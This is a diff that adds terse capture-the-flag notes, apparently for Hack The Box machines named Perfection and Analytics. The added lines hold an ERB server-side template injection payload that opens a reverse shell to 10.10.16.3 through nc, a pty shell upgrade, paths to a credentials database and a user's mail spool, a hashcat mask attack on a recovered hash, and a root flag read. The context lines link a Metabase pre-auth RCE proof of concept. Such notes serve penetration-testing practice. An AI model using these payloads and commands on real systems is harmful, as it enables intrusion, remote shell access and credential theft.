@@ -1,5 +1,16 @@
 容易忘
 
+Perfection
+test
+<%= system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 1234 >/tmp/f') %>
+test
+https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+~/Migration/pupilpath_credentials.db
+/var/spool/mail/susan
+hashcat -m 1400 -a 3 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
+sudo cat /root/root.txt
+
 Analytics
 data.analytical.htb
 https://github.com/m3m0o/metabase-pre-auth-rce-poc
